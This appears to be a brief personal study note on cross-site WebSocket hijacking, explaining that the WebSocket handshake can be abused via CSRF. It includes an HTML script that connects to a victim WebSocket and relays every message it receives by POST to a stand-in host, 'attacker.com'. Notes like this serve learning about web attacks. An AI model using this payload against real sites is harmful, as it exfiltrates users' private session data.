
ping pong 
this is simple protocol to make long sessions. chat program or gaming stuff 
But the handshake maybe vulnarable to [[skove/skoving/notes/web/CSRF]] attack

so i can dump and make every thing you can do.

here is my server:
```HTML
<script>
	var ws = new WebSocket('wss://vulnarable.com');
	
	ws.onopen = function() {
		ws.send("READY");
	};

	ws.onmessage = function(event) {
		fetch('http://attacker.com', {
		method: 'POST', mode: 'no-cors', body: event.data});
	};
</script>
```

And it can be vuln to other vulnz like ==SQLi, XSS, ..etc==
